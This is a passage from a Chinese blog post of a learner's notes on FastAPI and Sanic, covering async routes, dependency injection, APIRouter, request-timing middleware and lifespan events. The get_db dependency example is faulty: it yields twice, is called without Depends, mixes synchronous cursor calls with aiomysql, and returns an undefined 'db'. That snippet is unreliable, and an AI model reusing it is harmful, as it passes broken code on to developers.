+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="s2">&#34;SanicApp&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">])</span> <span class="c1"># 简单路由</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">read_root</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Hello from Sanic root&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/items/&lt;item_id&gt;&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;POST&#34;</span><span class="p">])</span> <span class="c1"># 带参数的路由（POST 请求）</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">create_item</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">item_id</span><span class="p">):</span>    
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span> <span class="c1"># 手动获取并处理请求体数据（Sanic 需手动校验）</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;No data provided&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;item_id&#34;</span><span class="p">:</span> <span class="n">item_id</span><span class="p">,</span> <span class="o">**</span><span class="n">data</span><span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>主要区别在于对 Post 的数据的处理上，Sanic 要手动处理，FastAPI 可以借助 Pydantic 模型。</p>
+<p>但是 Sanic 是异步非阻塞的框架，性能较高</p>
+</blockquote>
+<h2 id="异步编程实践"><strong>异步编程实践</strong>
+</h2><ul>
+<li><strong>异步函数</strong>：在 FastAPI 中，创建一个异步路由 (<code>/async-task</code>)，该路由模拟一个耗时操作（例如，使用 <code>asyncio.sleep</code>），并验证其不会阻塞其他请求。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 在原来的基础上添加函数</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># import asyncio 补充</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/sync&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sync_heavy_task</span><span class="p">():</span> <span class="c1"># 同步函数（用于对比，会阻塞）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># 模拟耗时 3 秒的同步操作</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;同步任务完成&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/async&#34;</span><span class="p">)</span> <span class="c1"># 异步路由（模拟耗时操作，不会阻塞）</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">async_task</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># 模拟异步耗时操作（非阻塞）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;异步任务完成&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;duration&#34;</span><span class="p">:</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>启动：<code>uvicorn fastapi_test:app --reload --port 8001</code></p>
+<blockquote>
+<ol>
+<li>测试过程中发现，需要给上面加上 <code>--worker 1</code>，设置为单线程</li>
+<li>用命令行 curl 的时候，没有效果，同步异步看不出差别，<strong>不知道为什么</strong></li>
+<li>用浏览器测，同时访问 /sync 时，明显不同步；同时访问 /async，基本同步；
+<ul>
+<li>但是一个先访问 /sync，另一个访问 /，是可以访问到 / 的，<strong>不知道为什么</strong>
+<ul>
+<li>FastAPI 运行在<strong>线程池模式</strong>，虽然单进程，但是后台有多线程池（？）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<ul>
+<li><strong>依赖注入</strong>：创建一个异步依赖函数，并在你的路由中使用它。这个依赖函数可以用来连接数据库或获取配置信息。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">get_db</span><span class="p">():</span> <span class="c1"># 异步依赖函数（模拟数据库连接）</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;建立数据库连接（异步）...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># conn = pymysql.connect(**db_config) 复用 mysql 的代码？ 要用 await！</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="k">await</span> <span class="n">aiomysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="o">**</span><span class="n">db_config</span><span class="p">)</span>  <span class="c1"># 异步建立连接</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">conn</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>  <span class="c1"># 异步关闭连接</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">yield</span> <span class="n">conn</span>  <span class="c1"># 提供依赖对象</span>
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;关闭数据库连接（异步）...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/items/</span><span class="si">{item_id}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># 使用异步依赖的路由</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">read_item</span><span class="p">(</span><span class="n">item_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 查询 students 表中的所有数据</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query_sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM students&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query_sql</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">students_data</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;item_id&#34;</span><span class="p">:</span> <span class="n">item_id</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;db_connection&#34;</span><span class="p">:</span> <span class="n">db</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;query_duration&#34;</span><span class="p">:</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<ul>
+<li>为什么用异步依赖？
+<ul>
+<li>使用<strong>异步依赖（<code>async def get_db()</code>）</strong> 的核心原因是为了匹配 FastAPI 的<strong>异步编程模型</strong>，避免因数据库操作阻塞整个应用，从而<strong>提升并发处理能力</strong>。</li>
+</ul>
+</li>
+<li>yield ？
+<ul>
+<li><code>yield</code> 最基础的作用是创建<strong>生成器（generator）</strong>，允许函数中断并返回中间结果，后续可<strong>从断点继续执行</strong>。在异步依赖中，被用来<strong>管理资源的生命周期</strong>（创建→使用→清理）。</li>
+<li>调用时，会在 yield 处返回值并暂停，下一次调用的时候继续上一次的调用结果</li>
+</ul>
+</li>
+<li>await ？
+<ul>
+<li><code>await</code> 仅能在<strong>异步函数（<code>async def</code> 定义）</strong> 中使用，用于<strong>暂停当前协程的执行</strong>，等待另一个异步操作（如网络请求、IO 操作）完成后再继续，期间不会阻塞事件循环（允许其他任务运行）。</li>
+<li>可以让出当前线程，等待耗时操作完成后再继续执行</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="项目结构与蓝图apirouter"><strong>项目结构与蓝图（APIRouter）</strong>
+</h2><ul>
+<li><strong>蓝图应用</strong>：将你的 API 拆分为多个模块，例如 <code>users</code> 和 <code>items</code>。使用 <code>APIRouter</code> 将这些模块组织起来，并在主应用中注册。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># item.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">APIRouter</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建一个 APIRouter 实例，相当于一个子路由集合</span>
+</span></span><span class="line"><span class="cl"><span class="n">item_router</span> <span class="o">=</span> <span class="n">APIRouter</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@item_router.get</span><span class="p">(</span><span class="s2">&#34;/items/</span><span class="si">{item_id}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_item</span><span class="p">(</span><span class="n">item_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;item_id&#34;</span><span class="p">:</span> <span class="n">item_id</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;获取物品信息&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@item_router.post</span><span class="p">(</span><span class="s2">&#34;/items/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_item</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">price</span><span class="p">:</span> <span class="nb">float</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="n">price</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;创建物品成功&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># user.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">APIRouter</span>
+</span></span><span class="line"><span class="cl"><span class="n">user_router</span> <span class="o">=</span> <span class="n">APIRouter</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@user_router.get</span><span class="p">(</span><span class="s2">&#34;/users/</span><span class="si">{user_id}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_user</span><span class="p">(</span><span class="n">user_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;user_id&#34;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;获取用户信息&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@user_router.post</span><span class="p">(</span><span class="s2">&#34;/users/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_user</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;创建用户成功&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># main.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 导入定义好的路由模块</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">user</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">item</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将用户路由注册到主应用，添加前缀 /users，这样访问用户相关接口需要用 /users/...</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">include_router</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">user_router</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;/users&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 将物品路由注册到主应用，添加前缀 /items，访问物品相关接口需要用 /items/...</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">include_router</span><span class="p">(</span><span class="n">item</span><span class="o">.</span><span class="n">item_router</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;/items&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><strong>分离路由</strong>：确保 <code>users</code> 相关的路由（如 <code>/users/{user_id}</code>）和 <code>items</code> 相关的路由（如 <code>/items/{item_id}</code>）分别在不同的文件中定义。</li>
+</ul>
+<blockquote>
+<p>确保不同功能模块的路由（比如用户相关路由和物品相关路由）分别在不同的文件中定义，类似把代码解耦，便于维护</p>
+</blockquote>
+<p>使用方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">项目结构：
+</span></span><span class="line"><span class="cl">project/
+</span></span><span class="line"><span class="cl">├── main.py          # 主应用入口
+</span></span><span class="line"><span class="cl">├── routers/         # 存放所有路由模块的文件夹
+</span></span><span class="line"><span class="cl">│   ├── users.py     # 用户相关路由（登录、注册等）
+</span></span><span class="line"><span class="cl">│   └── items.py     # 商品相关路由（查询、创建等）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># 组件中，创建 APIRouter 实例</span>
+</span></span><span class="line"><span class="cl"><span class="n">router</span> <span class="o">=</span> <span class="n">APIRouter</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prefix</span><span class="o">=</span><span class="s2">&#34;/users&#34;</span><span class="p">,</span>  <span class="c1"># 该模块所有路由的统一前缀（访问时需加 /users）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">]</span>    <span class="c1"># 文档中归类的标签（方便在 /docs 中区分）</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义请求模型（可选，用于数据校验）</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserCreate</span><span class="p">(</span><span class="n">BaseModel</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">email</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义路由</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@router.get</span><span class="p">(</span><span class="s2">&#34;/</span><span class="si">{user_id}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_user</span><span class="p">(</span><span class="n">user_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># main.py 中，创建主应用</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">(</span><span class="n">title</span><span class="o">=</span><span class="s2">&#34;...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 注册路由（将 users_router 和 items_router 挂载到主应用）</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">include_router</span><span class="p">(</span><span class="n">users_router</span><span class="p">)</span> <span class="c1"># 这样会自动匹配 users_router 的前缀</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="中间件与生命周期管理"><strong>中间件与生命周期管理</strong>
+</h2><ul>
+<li><strong>中间件</strong>：为你的 FastAPI 应用添加一个自定义中间件，该中间件能够记录每个请求的耗时，并将信息打印到控制台。</li>
+</ul>
+<blockquote>
+<p>中间件是在<strong>请求到达路由</strong>和<strong>响应返回客户端</strong>之间执行的代码，可用于日志记录、权限校验、耗时统计等。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span><span class="p">,</span> <span class="n">Request</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.middleware</span><span class="p">(</span><span class="s2">&#34;http&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">log_request_time</span><span class="p">(</span><span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">,</span> <span class="n">call_next</span><span class="p">):</span> <span class="c1"># 这里的 call_next 会自动填充</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;中间件开始执行&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># 强制刷新</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">call_next</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">process_time</span> <span class="o">=</span> <span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1000</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;请求 </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2"> 耗时: </span><span class="si">{</span><span class="n">process_time</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">ms&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># 强制刷新</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/test&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">test_route</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;测试成功&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>测试的时候，用 vscode 的终端启动会看不到输出，换成了 cmd 才可以</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/calendar0917/images/master/image-20251021082055612.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251021082055612"
+	
+	
+></p>
+<ul>
+<li><strong>异步状态管理</strong>：使用 <code>app.on_event(&quot;startup&quot;)</code> 和 <code>app.on_event(&quot;shutdown&quot;)</code> 钩子，编写一个函数来初始化数据库连接池，并在应用关闭时安全地断开连接。</li>
+</ul>
+<blockquote>
+<p><a class="link" href="https://fastapi.tiangolo.com/zh/reference/fastapi/?query=on_event#fastapi.FastAPI.on_event"  target="_blank" rel="noopener"
+    >FastAPI class - FastAPI</a>：<code>on_event</code> is deprecated, use <code>lifespan</code> event handlers instead.</p>
+<ol>
+<li><strong>错误处理更优雅</strong>：<code>Lifespan</code> 可以通过上下文管理器（<code>async with</code>）捕获启动 / 关闭过程中的异常，确保资源正确清理。</li>
+<li><strong>代码组织更清晰</strong>：将启动和关闭逻辑集中在一个 <code>Lifespan</code> 类中，比分散的 <code>on_event</code> 装饰器更易维护。</li>
+</ol>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
